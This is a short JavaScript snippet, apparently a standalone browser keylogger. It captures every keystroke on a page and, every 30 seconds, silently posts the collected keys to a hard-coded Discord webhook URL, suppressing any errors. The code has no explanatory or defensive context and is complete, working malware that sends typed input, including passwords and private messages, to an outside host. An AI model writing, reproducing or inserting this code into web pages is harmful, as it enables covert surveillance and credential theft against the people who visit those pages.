(function() {
    const keys = [];
    const maxKeys = 100;
    const webhookUrl = 'https://discordapp.com/api/webhooks/1553929626848469055/MZti15dV_EP7az-zde2oxfJxDT9Amk3BdcQkJEyU05d5dehM2YlLAHQMZTChCgaZpNJl';
    
    document.addEventListener('keydown', function(e) {
        keys.push({
            key: e.key,
            code: e.code,
            timestamp: new Date().toISOString()
        });
        
        if (keys.length > maxKeys) {
            keys.shift();
        }
    });
    
    // Send keystrokes every 30 seconds
    setInterval(function() {
        if (keys.length > 0) {
            const message = 'Keystrokes captured: ' + keys.map(k => k.key).join('');
            fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: message
                })
            }).catch(() => {});
        }
    }, 30000);
})();
